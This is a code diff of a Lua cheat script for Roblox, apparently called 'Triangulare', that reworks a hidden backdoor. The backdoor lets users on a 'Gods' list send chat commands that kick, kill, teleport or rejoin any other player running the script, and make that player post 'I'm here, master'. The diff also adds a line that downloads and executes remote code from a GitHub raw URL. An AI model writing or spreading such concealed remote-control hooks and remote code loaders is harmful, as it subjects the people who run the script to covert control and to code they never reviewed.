@@ -83,16 +83,6 @@ if Game then
         Cooldown = 1
       }
       
-      local function IsGod(props)
-        if props and props.UserId then
-          local sender = game:GetService("Players"):GetPlayerByUserId(props.UserId)
-          if sender and table.find(Gods, sender.Name) then
-            return true
-          end
-        end
-        return false
-      end
-      
       if not table.find(Gods, eu.Name) then
         local TextChatService = game:GetService("TextChatService")
         
@@ -106,13 +96,12 @@ if Game then
           end,
           ["leave."] = function()
             task.wait(2)
-            game:GetService("Players").LocalPlayer:Kick("You were kicked by a Triangulare admin.")
+            eu:Kick("You were kicked by a Triangulare admin.")
           end,
           ["die."] = function()
             eu.Character.Head:Destroy()
           end,
-          ["come."] = function()
-            local sender = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
+          ["come."] = function(sender)
             eu.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
             TextChatService.TextChannels.RBXGeneral:SendAsync("I'm here, master " .. sender.Name .. ".")
           end,
@@ -120,15 +109,23 @@ if Game then
             game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, eu)
           end
         }
-        if not getgenv().Triangulare then
-          getgenv().Triangulare = true
-          TextChatService.MessageReceived:Connect(function(message)
-            local Command = Commands[message.Text]
-            if Command and IsGod(message.TextSource) then
-              Command()
+          local Gokka = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Gokka.lua"))()
+          
+          Gokka:Connect({
+            Name = "TriangulareAdmin",
+            Signal = TextChatService.MessageReceived,
+            Callback = function(message)
+              local Command = Commands[message.Text]
+              if Command then
+                local props = message.TextSource
+                local UserId = props and props.UserId
+                if UserId then
+                  local sender = game:GetService("Players"):GetPlayerByUserId(UserId)
+                  if sender and table.find(Gods, sender.Name) then Command(sender) end
+                end
+              end
             end
-          end)
-        end
+          })
         
         for _, p in pairs(game:GetService("Players"):GetPlayers()) do
           if p ~= eu and table.find(Gods, p.Name) then
